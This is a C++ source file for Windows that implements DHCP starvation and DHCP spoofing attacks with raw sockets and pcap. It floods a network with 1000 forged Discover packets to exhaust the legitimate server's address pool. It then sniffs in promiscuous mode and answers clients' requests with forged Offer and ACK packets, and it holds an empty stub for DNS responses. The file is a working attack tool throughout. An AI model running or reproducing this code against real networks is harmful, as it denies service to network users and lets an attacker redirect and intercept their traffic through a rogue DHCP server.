#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define HAVE_REMOTE
#define WPCAP

#include "Headers.h"
#include "Packets.h"
#include "Utils.h"
#include "Spoofing.h"

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <time.h>
#include <iostream>
#include <Mstcpip.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#pragma pack(1)
#pragma comment(lib, "Ws2_32.lib")

void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP, Ethernet_header& pEther);

int sendDiscoverPacket(AddressInfo& info)
{
	SOCKET s;
	sockaddr_in dst;
	int optval = 1;

	dst.sin_family = AF_INET;
	dst.sin_port = htons(67);								/* difine the destination */
	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket

	if (s == SOCKET_ERROR)
	{
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
		WSACleanup();
		return 1;
	}

	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket


	char* raw_packet = new char[65536];
	createDHCPDiscoverPacket(raw_packet, info);

	sendto(
		s,
		raw_packet,
		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
		0, (sockaddr*)&dst,
		sizeof(dst)
	);
	delete[] raw_packet;
	closesocket(s);
	return 0;
}

int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
{
	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
	
	char* raw_packet = new char[65536];
	if (!sock)
	{
		std::cout << "error in pcap socket" << std::endl;
		return 1;
	}
		
	
	createDHCPOfferPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);

	printIP(((IP_header*)&raw_packet[sizeof(Ethernet_header)])->ip_destaddr);

	if (pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
	) != 0)
	{
		std::cout << "error " << pcap_geterr(sock) << std::endl;
		return 1;
	}
		
	
#if _DEBUG
	std::cout << "sent" << std::endl;
#endif

	delete[] raw_packet;
	pcap_close(sock);
	return 0;
}

int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* sock, AddressInfo& info)
{
	createDHCPackPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);

	if (pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
	) != 0)
	{
		std::cout << "error " << pcap_geterr(sock) << std::endl;
		return 1;
	}
	return 0;
}

int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& info)
{
	return 0;
}

DWORD WINAPI startDHCPStarvation(LPVOID info)
{
	
	for (int i = 0; i < 1000; i++)
	{
		sendDiscoverPacket(*(AddressInfo*)info);
		Sleep(20);
	}
	return 1;
}

DWORD WINAPI startSpoofing(LPVOID info)
{
	SOCKET s;
	sockaddr_in sockinfo;
	sockaddr_in dst;
	int size = sizeof(dst);
	pcap_pkthdr header;

	DHCP_header pDHCP{};
	UDP_header pUDP{};
	IP_header pIP{};
	Ethernet_header pEther{};

	u_char* raw_packet;
	char* ack_packet = new char[65536];
	
	bool sent = false;
	// socket for sending ack
	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);

	if (!sock)
	{
		std::cout << "error in pcap socket" << std::endl;
		return 1;
	}

	// listening 
	while (!sent)
	{
		memset(ack_packet, 0, 65536);

		raw_packet = (u_char*)pcap_next(sock, &header);

		if (!header.len)
			break;

		getDHCPPacketInfo((char*)raw_packet, pDHCP, pUDP, pIP, pEther);

		if (checkForDHCP(pDHCP))
				if (getDHCPtype(pDHCP) == 3)
					sent = sendACKPacket(ack_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
	}
	delete[] ack_packet;
	pcap_close(sock);
	return -1;
}
